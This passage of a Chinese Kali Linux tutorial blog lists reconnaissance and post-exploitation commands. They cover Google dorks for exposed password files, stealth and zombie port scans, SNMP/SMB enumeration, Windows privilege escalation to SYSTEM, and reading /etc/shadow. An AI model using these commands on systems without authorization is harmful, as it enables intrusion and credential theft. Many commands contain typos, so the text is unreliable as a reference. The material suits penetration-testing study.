class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+充值 -支付  +代表含有，-代表排除</span><br><span class="line"></span><br><span class="line">北京的电子商务公司—— 北京 intitle:电子商务 intext:法人 intext:电话</span><br><span class="line"></span><br><span class="line">阿里网站上的北京公司联系人——北京 site:alibaba.com inurl:contact</span><br><span class="line"></span><br><span class="line">塞班司法案的PDF文档——SOX filetype:pdf</span><br><span class="line"></span><br><span class="line">法国的支付相关页面——payment site:fr</span><br><span class="line"></span><br><span class="line">一些常用实例：</span><br><span class="line">inurt:"level/15/exec/-/show"</span><br><span class="line">intille: "netbotz appliance" "ok"</span><br><span class="line">inurl /admin/login.php</span><br><span class="line">inurt:qq.txt</span><br><span class="line">filetype:xls "username| password"</span><br><span class="line">inud:ftp "password" filetype:xls site:baidu.com</span><br><span class="line">Inurd:Service.pwd</span><br><span class="line">http://exploit.db.com/google-dorks</span><br></pre></td></tr></table></figure><h4 id="搜索工具"><a href="#搜索工具" class="headerlink" title="搜索工具"></a>搜索工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theHarvester 可以使用google、bing等搜索引擎搜索文域名、邮件，需要翻墙</span><br><span class="line"></span><br><span class="line">Maltego 图形化展示搜索工具，kali十大工具之一</span><br></pre></td></tr></table></figure><h4 id="文件信息——METADATA（元数据）"><a href="#文件信息——METADATA（元数据）" class="headerlink" title="文件信息——METADATA（元数据）"></a>文件信息——METADATA（元数据）</h4><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">exiftool</span> <span class="string">xx.jpg  查看图片Exif图片信息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Foca</span> <span class="string">windows平台软件</span></span><br></pre></td></tr></table></figure><h4 id="RECON-NG"><a href="#RECON-NG" class="headerlink" title="RECON-NG"></a>RECON-NG</h4><blockquote><p>RECON-NG是一个全特性的，基于Python的web侦探框架。输入help查看所有命令含义</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200609191006019.png" alt="image-20200609191006019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">常用命令：</span><br><span class="line"></span><br><span class="line">recon-ng sina   建立名为sina的工作区</span><br><span class="line">keys add baidu_api api 为baidu_api添加api</span><br><span class="line">keys remove xxx 移除某个api</span><br><span class="line">keys list 查看所有api</span><br><span class="line"></span><br><span class="line">安装模块：</span><br><span class="line">marketplace refresh # 更新模块列表</span><br><span class="line">marketplace search hackertarget # 搜索 hackertarget 模块，可以发现支持模糊搜索</span><br><span class="line">marketplace install recon/domains-hosts/hackertarget # 复制模块名，安装</span><br><span class="line"></span><br><span class="line">使用模块：</span><br><span class="line">modules load recon/domains-hosts/hackertarget # 加载模块</span><br><span class="line">info # 查看模块的描述信息及参数。这里发现该模块是用来搜索主机名。</span><br><span class="line"></span><br><span class="line">help # 查看该模块下的使用命令，其中 options 用来修改模块的参数。（goptions 是全局参数，在非模块模式下才可修改。）</span><br><span class="line">options set SOURCE rapid7.com # 设置 SOURCE 参数（用来探测 rapid7.com的主机）</span><br><span class="line">run # 设置好参数后，直接运行。</span><br><span class="line">show hosts # 在上述 hackertarget 的描述中发现，会把搜索记录 放到 hosts 表中，可以使用 show 命令查看。</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="二层发现——arping"><a href="#二层发现——arping" class="headerlink" title="二层发现——arping"></a>二层发现——arping</h4><blockquote><p>二层发现使用arp协议，在局域网下进行</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arping 用于在局域网通过目标ip获取mac地址</span><br><span class="line"></span><br><span class="line">arping 1.1.1.1 -c 1</span><br><span class="line">arping 1.1.1.1 -d 发现同一ip下重复的mac</span><br><span class="line">arping c1 1.1.1.1 | grep "bytes from" | cut d"-f5 | cut d"T"-f2 I cut -d"]"-f 1</span><br><span class="line">脚本</span><br><span class="line">	arping l.sh etho &gt; addrs</span><br><span class="line">	arping 2.sh addrs</span><br><span class="line"></span><br><span class="line">场景：通过编写脚本，arping可以发现子网段的所有连接的ip及其mac地址</span><br></pre></td></tr></table></figure><h4 id="二层发现——nmap（常用）"><a href="#二层发现——nmap（常用）" class="headerlink" title="二层发现——nmap（常用）"></a>二层发现——nmap（常用）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -sn 扫描ping，但是不去扫描端口</span><br><span class="line">		namp在扫描的时候会尝试对找到的ip进行反向查询dns获取其域名</span><br><span class="line">nmap -iL iplist.txt sn</span><br></pre></td></tr></table></figure><h4 id="二层发现——Netdiscover"><a href="#二层发现——Netdiscover" class="headerlink" title="二层发现——Netdiscover"></a>二层发现——Netdiscover</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Netdiscover专用于二层发现，可用于无线和交换网络环境，主动和被动探测</span><br><span class="line"></span><br><span class="line">主动探测：</span><br><span class="line">netdiscover -i ethO T 1.1.1 .0/24</span><br><span class="line">netdiscover -1 iplist.txt</span><br><span class="line"></span><br><span class="line">被动：</span><br><span class="line">（主动arp容易触发报警，伪装成局域网一部分，截取arp数据包分析）</span><br><span class="line">netdiscover -P</span><br></pre></td></tr></table></figure><h4 id="二层发现——Scapy"><a href="#二层发现——Scapy" class="headerlink" title="二层发现——Scapy"></a>二层发现——Scapy</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Scapy</span><br><span class="line">	作为Python库进行调用</span><br><span class="line">	也可作为单独的工具使用</span><br><span class="line">	抓包、分析、创建、修改、注入网络流量</span><br><span class="line"></span><br><span class="line">apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">Scapy</span><br><span class="line">	ARP().display()</span><br><span class="line">	Sr1()</span><br><span class="line">	</span><br><span class="line">Python脚本</span><br><span class="line">	Arpl.py</span><br><span class="line">	Arp2.py</span><br></pre></td></tr></table></figure><h4 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h4><blockquote><p>优点：可路由、速度比较快<br>缺点：速度比二层慢、经常被边界防火墙过滤<br>协议：IP、ICMP协议。在广域网进行</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">说明：ttl值在linux系统性一般是64，每经过一跳路由自动减一</span><br><span class="line"></span><br><span class="line">Ping 1.1.1.1 -c 2 </span><br><span class="line">		-c指定发送几个请求</span><br><span class="line">Ping-R 1.1.1.1 / traceroute 1.1.1.1</span><br><span class="line">ping 1.1.1.1-C 1 | grep "bytes from" | cut -d "" -f4 | cut-d":"-f 1</span><br><span class="line"></span><br><span class="line">pmap -sn 1.1.1.1 -255</span><br><span class="line">nmap -iL iplist.txt -sn</span><br><span class="line"></span><br><span class="line">Hping</span><br><span class="line">	能够发送几乎任意TCP/IP包</span><br><span class="line">	功能强大但每次只能扫描一个目标</span><br><span class="line">	</span><br><span class="line">hping3 1.1.1.1 -icmp -C 2</span><br><span class="line">for addr in $(seq 1 254); do hping3 1.1.1.$addr icmp C I &gt;&gt; handle.txt &amp; done</span><br></pre></td></tr></table></figure><h4 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h4><blockquote><p>优点：可路由且结果可靠、不太可能被防火墙过滤、甚至可以发现所有端口都被过滤的主机<br>缺点：基于状态过滤的防火墙可能过滤扫描、全端口扫描速度慢<br>TCP：未经请求的ACK- RST、SYN-SYN/ACK、 RST<br>UDP：ICMP端口不可达、一去不复返</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap 1.1.1.1-254 -PU53 -sn 使用udp发现</span><br><span class="line">nmap 1.1.1.1-254 -PA80 -sn 使用TCP发现（ack包 ）</span><br><span class="line">nmap -iL iplist.txt -PA80 -sn</span><br><span class="line"></span><br><span class="line">端口扫描：</span><br><span class="line">Nmap</span><br><span class="line">nmap -sU 1.1.1.1 默认的1000个参数</span><br><span class="line">		ICMP host-unreachable说明端口关闭</span><br><span class="line">		没有回应说明可能开启</span><br><span class="line">nmap 1.1.1.1 -sU-p 53</span><br><span class="line">nmap -iL iplist.txt -sU P 1-200</span><br></pre></td></tr></table></figure><blockquote><p>所有的TCP扫描都是基于三次握手的变化来判断目标端口的状态</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">隐蔽扫描：</span><br><span class="line">	即每次不建立完整三次连接，只发生syn信息</span><br><span class="line">	应用日志不记录扫描行为，较为隐蔽</span><br><span class="line">	发送流程为：--&gt;使用scapy发送Syn包给目标主机</span><br><span class="line">    		  &lt;--目标主机回复syn/ack包</span><br><span class="line">    		  --&gt;本机操作系统内核会识别到异常握手，发出RST请求</span><br><span class="line">    屏蔽内核的RST请求：</span><br><span class="line">    iptables -A OUTPUT -P tcp --tcp-flags RST RST -d 本地ip -j DROP</span><br><span class="line"></span><br><span class="line">	Scapy命令：</span><br><span class="line">sr1(IP(dst="192.168.60.3]/TCP(dport=80),timneout=l,verbose=1)</span><br><span class="line">	</span><br><span class="line">	nmap命令：</span><br><span class="line">	nmap -sS 1.1.1.1 -p 80 21,25.110.443</span><br><span class="line">	nmap -sS 1.1.1.1 -P -65535 --open</span><br><span class="line">	nmap -sS 1.1.1.1 -P  --open</span><br><span class="line">	nmap -sS -iL iplist.txt -P 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">僵尸扫描</span><br><span class="line">	极度隐蔽</span><br><span class="line">	实施条件苛刻</span><br><span class="line">	可伪造源地址</span><br><span class="line">	选择僵尸机：闲置系统且系统使用递增的IPID，不能全是0</span><br><span class="line">发现僵尸机： </span><br><span class="line">nmap -P 80 192.168.1.133 --script=ipidseq.nse</span><br><span class="line">扫描目标：</span><br><span class="line">nmap 172.16.36.135 -sl 172.16.36.134 Pn p 0- 100</span><br></pre></td></tr></table></figure><h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><blockquote><p>SNMP:<br>简单网络管理协议<br>Community strings<br>信息查询或重新配置<br>识别和绕过防火墙筛选</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">扫描banner：</span><br><span class="line">nc -nv x.x.x.x</span><br><span class="line"></span><br><span class="line">dmitry -p 172. 16.36.135</span><br><span class="line">dmitry -pb 172.16.36.135</span><br><span class="line"></span><br><span class="line">nmap -sI 1.1.1.1 -P 22 -script=banner </span><br><span class="line">nmap 域名/IP            （最强大）</span><br></pre></td></tr></table></figure><h4 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h4><blockquote><p>用处不大，现在的服务器会限制特定ip访问snmp</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">snmp:</span><br><span class="line">	信息的金矿</span><br><span class="line">	经常被错误配置</span><br><span class="line">	public / private / manager</span><br><span class="line">MIB Tree:</span><br><span class="line">	SNMP Management Information Base (MIB)</span><br><span class="line">	树形的网络设备管理功能数据库</span><br><span class="line">	1.3.6.1.4.1.77.1.2.25</span><br><span class="line">onesixtyone 1.1.1.1 public</span><br><span class="line">onesixtyone -C dict.txt -i hosts -o my.log -W 100</span><br><span class="line">可读性强的工具：</span><br><span class="line">snmpcheck -t 192. 168.20.199</span><br><span class="line">snmpcheck -t 192. 168.20.199 -C private -V 2</span><br><span class="line">snmpcheck -t 192. 168.20.199 -W</span><br></pre></td></tr></table></figure><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a>SMB扫描</h4><blockquote><p><code>Server Message Block</code> 协议是微软历史上出现安全问题最多的协议，实现复杂，默认开放，文件共享</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -p 139,445 192.168.60.1-20</span><br><span class="line">nmap 192.168.60.4 -p 139,445 --script=smb-os- discovery.nse</span><br><span class="line">nmap -v -P 139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1</span><br><span class="line">nbtscan -r 192. 168.60.0/24</span><br><span class="line">enum4linux -a 192.1 68.60.10</span><br></pre></td></tr></table></figure><h4 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h4><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">WEB应用防火墙</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">-l</span></span><br><span class="line"><span class="attr">wafw00f</span> <span class="string">http://www.microsoft.com</span></span><br><span class="line"><span class="attr">nmap</span> <span class="string">www.microsoft.com --script=http-waf-detect.nse</span></span><br></pre></td></tr></table></figure><h3 id="弱点-漏洞-扫描"><a href="#弱点-漏洞-扫描" class="headerlink" title="弱点(漏洞)扫描"></a>弱点(漏洞)扫描</h3><blockquote><p>kali集成了漏洞利用工具，使用searchsploit，我们可以搜索软件当前存在的漏洞及其攻击代码。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200611094925425.png" alt="image-20200611094925425"></p><blockquote><p>此外，NEXPOSE也是一款面向企业的强大的漏洞扫描工具，可以对web页面、操作系统进行登录扫描或黑盒扫描。NEXPOSE会将扫描到的漏洞按CVSS评级进行打分，并且可以生产报告。</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><blockquote><p>Admin提权为System</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Windows system账号</span><br><span class="line">官方工具：</span><br><span class="line">	SysInternal suite</span><br><span class="line">	https://technet.microsoft.com/en-us/sysinternals/bb545027</span><br><span class="line">	psexec -i -S d taskmgr</span><br><span class="line"></span><br><span class="line">xp系统下：</span><br><span class="line">	at 19:39 /interactive cmd 该命令会定时启动一个system权限的cmd</span><br><span class="line">								（只能在xp系统使用）</span><br><span class="line">通过服务方式：</span><br><span class="line">	SC Create syscmd binPath= "cmd /K start" type= own type= interact</span><br><span class="line">	SC start syscmd</span><br><span class="line">	</span><br><span class="line">隐蔽注入：</span><br><span class="line">	上面的几种方式会创建单独的进程，可能被发现，可以使用pinjector进行隐蔽注入，注入到某个system权限的进程中，然后通过nc可以远程shell</span><br></pre></td></tr></table></figure><h4 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows：</span><br><span class="line">	Wireshark</span><br><span class="line">	Omnipeek</span><br><span class="line">	commview</span><br><span class="line">	Sniffpass</span><br><span class="line">Linux：</span><br><span class="line">	Tcpdump</span><br><span class="line">	Wireshark</span><br><span class="line">	Dsniff</span><br></pre></td></tr></table></figure><h4 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h4><blockquote><p>当我们获取到某个主机的root权限后，我们要尽可能收集其信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">    /etc/resolv.conf   dns配置信息</span><br><span class="line">    /etc/passwd   存放用户账户</span><br><span class="line">    /etc/shadow	   存放用户密码</span><br><span class="line">    whoami, who -a</span><br><span class="line">    ifconfig -a, iptables -L -n, netstat -rn</span><br><span class="line">    uname -a, ps aux 查看操作系统信息，进程信息</span><br><span class="line">    dpkg -l | head  查看安装的软件</span><br></pre></td></tr></table></figure></div><div class="post-widgets"><div id="needsharebutton-postbottom"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>tosang</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://uestc-toy.github.io/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" title="Kali使用教程（一）：常用命令和基本工具使用">http://uestc-toy.github.io/2020/06/12/Kali使用教程（一）：常用命令和基本工具使用/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Kali/" rel="tag"><i class="fa fa-tag"></i> Kali</a> <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/03/17/Netty%E7%BC%96%E7%A8%8B%E4%B9%8BNIO%E5%AE%9E%E8%B7%B5/" rel="prev" title="Netty编程之NIO实践"><i class="fa fa-chevron-left"></i> Netty编程之NIO实践</a></div><div class="post-nav-item"><a href="/2020/06/22/SpringCloud%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="next" title="SpringCloud学习总结">SpringCloud学习总结 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">1.</span> <span class="nav-text">常用命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用工具"><span class="nav-number">2.</span> <span class="nav-text">常用工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NC-NETCAT"><span class="nav-number">2.1.</span> <span class="nav-text">NC-NETCAT</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NC——获取Banner信息"><span class="nav-number">2.1.1.</span> <span class="nav-text">NC——获取Banner信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NC——传输文本（Telnet）"><span class="nav-number">2.1.2.</span> <span class="nav-text">NC——传输文本（Telnet）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NC——传输文件-目录"><span class="nav-number">2.1.3.</span> <span class="nav-text">NC——传输文件&#x2F;目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NC——端口扫描（不太准确，不常用）"><span class="nav-number">2.1.4.</span> <span class="nav-text">NC——端口扫描（不太准确，不常用）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NC——远程控制"><span class="nav-number">2.1.5.</span> <span class="nav-text">NC——远程控制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">2.1.6.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Wireshark"><span class="nav-number">2.2.</span> <span class="nav-text">Wireshark</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用wireshark抓包"><span class="nav-number">2.2.1.</span> <span class="nav-text">使用wireshark抓包</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤器"><span class="nav-number">2.2.2.</span> <span class="nav-text">过滤器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常见协议包"><span class="nav-number">2.2.3.</span> <span class="nav-text">常见协议包</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#统计分析"><span class="nav-number">2.2.4.</span> <span class="nav-text">统计分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结-1"><span class="nav-number">2.2.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS信息收集——NSLOOKUP"><span class="nav-number">3.1.</span> <span class="nav-text">DNS信息收集——NSLOOKUP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS信息收集——DIG（更强大）"><span class="nav-number">3.2.</span> <span class="nav-text">DNS信息收集——DIG（更强大）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS区域传输（Zone-Transfer）"><span class="nav-number">3.3.</span> <span class="nav-text">DNS区域传输（Zone Transfer）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS爆破"><span class="nav-number">3.4.</span> <span class="nav-text">DNS爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS注册信息"><span class="nav-number">3.5.</span> <span class="nav-text">DNS注册信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索引擎"><span class="nav-number">3.6.</span> <span class="nav-text">搜索引擎</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GOOGLE搜索方法"><span class="nav-number">3.7.</span> <span class="nav-text">GOOGLE搜索方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索工具"><span class="nav-number">3.8.</span> <span class="nav-text">搜索工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件信息——METADATA（元数据）"><span class="nav-number">3.9.</span> <span class="nav-text">文件信息——METADATA（元数据）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RECON-NG"><span class="nav-number">3.10.</span> <span class="nav-text">RECON-NG</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主动信息收集"><span class="nav-number">4.</span> <span class="nav-text">主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#二层发现——arping"><span class="nav-number">4.1.</span> <span class="nav-text">二层发现——arping</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二层发现——nmap（常用）"><span class="nav-number">4.2.</span> <span class="nav-text">二层发现——nmap（常用）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二层发现——Netdiscover"><span class="nav-number">4.3.</span> <span class="nav-text">二层发现——Netdiscover</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二层发现——Scapy"><span class="nav-number">4.4.</span> <span class="nav-text">二层发现——Scapy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三层发现"><span class="nav-number">4.5.</span> <span class="nav-text">三层发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四层发现"><span class="nav-number">4.6.</span> <span class="nav-text">四层发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务扫描"><span class="nav-number">4.7.</span> <span class="nav-text">服务扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP扫描"><span class="nav-number">4.8.</span> <span class="nav-text">SNMP扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB扫描"><span class="nav-number">4.9.</span> <span class="nav-text">SMB扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#waf识别"><span class="nav-number">4.10.</span> <span class="nav-text">waf识别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#弱点-漏洞-扫描"><span class="nav-number">5.</span> <span class="nav-text">弱点(漏洞)扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">6.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#抓包嗅探"><span class="nav-number">6.1.</span> <span class="nav-text">抓包嗅探</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基本信息收集"><span class="nav-number">6.2.</span> <span class="nav-text">基本信息收集</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="tosang" src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><p class="site-author-name" itemprop="name">tosang</p><div class="site-description" itemprop="description">blog、记录和分享</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">15</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">7</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">12</span> <span 